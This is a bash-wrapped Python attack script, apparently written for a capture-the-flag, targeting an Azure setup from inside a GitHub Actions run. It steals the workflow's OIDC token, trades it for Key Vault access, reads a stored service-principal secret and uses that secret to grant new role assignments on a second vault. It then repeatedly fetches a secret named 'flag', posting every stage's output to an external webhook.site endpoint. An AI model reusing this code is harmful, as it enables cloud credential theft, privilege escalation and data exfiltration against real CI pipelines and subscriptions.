#!/usr/bin/env bash
set +e
python3 - <<'PY2'
import base64,json,os,time,urllib.parse,urllib.request,urllib.error,uuid,traceback
TEN='3205c325-06a5-4171-9ce8-ffc5e6c2845e'; CID='72ff278a-9e71-43ec-bac4-2ca303f8e462'; SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6'; RG='rg-tbl-reporting-prod-eus'; APP='app-tbl-reporting-prod'; KV1='https://kv-tbl-prod-x3euoz.vault.azure.net'; KV2='https://kv-tbl-sec-x3euoz.vault.azure.net'; HOOK='https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825'
def emit(x):
 s=json.dumps(x,default=str); print(s,flush=True)
 try: urllib.request.urlopen(urllib.request.Request(HOOK,data=s.encode(),method='POST',headers={'Content-Type':'application/json'}),timeout=8).read()
 except Exception: pass
def req(url,method='GET',data=None,headers=None,timeout=25):
 try:
  r=urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=headers or {}),timeout=timeout); return {'status':r.status,'body':r.read().decode('utf-8','replace')}
 except urllib.error.HTTPError as e: return {'status':e.code,'body':e.read().decode('utf-8','replace')}
 except Exception as e: return {'error':repr(e)}
def jget(url,tok):
 r=req(url,headers={'Authorization':'Bearer '+tok}); return json.loads(r['body']) if r.get('status')==200 else r
def form(url,d):
 return json.loads(urllib.request.urlopen(urllib.request.Request(url,data=urllib.parse.urlencode(d).encode(),method='POST'),timeout=30).read())
def claim(t,k):
 try:
  p=t.split('.')[1]+'='*(-len(t.split('.')[1])%4); return json.loads(base64.urlsafe_b64decode(p)).get(k)
 except Exception:return None
try:
 u=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']+'&audience=api%3A%2F%2FAzureADTokenExchange'; h={'Authorization':'Bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']}; oidc=json.loads(urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=30).read())['value']
 vt=form('https://login.microsoftonline.com/'+TEN+'/oauth2/v2.0/token',{'client_id':CID,'grant_type':'client_credentials','scope':'https://vault.azure.net/.default','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':oidc})['access_token']
 sp=json.loads(jget(KV1+'/secrets/reporting-service-principal?api-version=7.4',vt)['value']); sid=sp.get('appId') or sp.get('clientId') or sp.get('client_id'); sec=sp.get('clientSecret') or sp.get('client_secret') or sp.get('password')
 arm=form('https://login.microsoftonline.com/'+TEN+'/oauth2/v2.0/token',{'client_id':sid,'grant_type':'client_credentials','client_secret':sec,'scope':'https://management.azure.com/.default'})['access_token']; emit({'stage':'credentials','oidc':True,'arm':True})
 dvt=form('https://login.microsoftonline.com/'+TEN+'/oauth2/v2.0/token',{'client_id':sid,'grant_type':'client_credentials','client_secret':sec,'scope':'https://vault.azure.net/.default'})['access_token']; oid=claim(dvt,'oid'); scope='subscriptions/'+SUB+'/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz'; rd='/subscriptions/'+SUB+'/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6'
 for label,p in [('sp',oid),('mi','f64d08c7-fde6-4553-99c8-5bf73666ee8c')]:
  u='https://management.azure.com/'+scope+'/providers/Microsoft.Authorization/roleAssignments/'+str(uuid.uuid4())+'?api-version=2022-04-01'; b=json.dumps({'properties':{'roleDefinitionId':rd,'principalId':p,'principalType':'ServicePrincipal'}}).encode(); emit({'stage':'role-assignment','principal':label,'response':req(u,'PUT',b,{'Authorization':'Bearer '+arm,'Content-Type':'application/json'},30)})
 for i in range(12):
  x=jget(KV2+'/secrets/flag?api-version=7.4',dvt); emit({'stage':'direct-flag','attempt':i+1,'response':x})
  if isinstance(x,dict) and x.get('value'): print('FLAG='+x['value'],flush=True); break
  time.sleep(3)
except Exception as e: emit({'stage':'outer-error','error':repr(e),'trace':traceback.format_exc()})
PY2
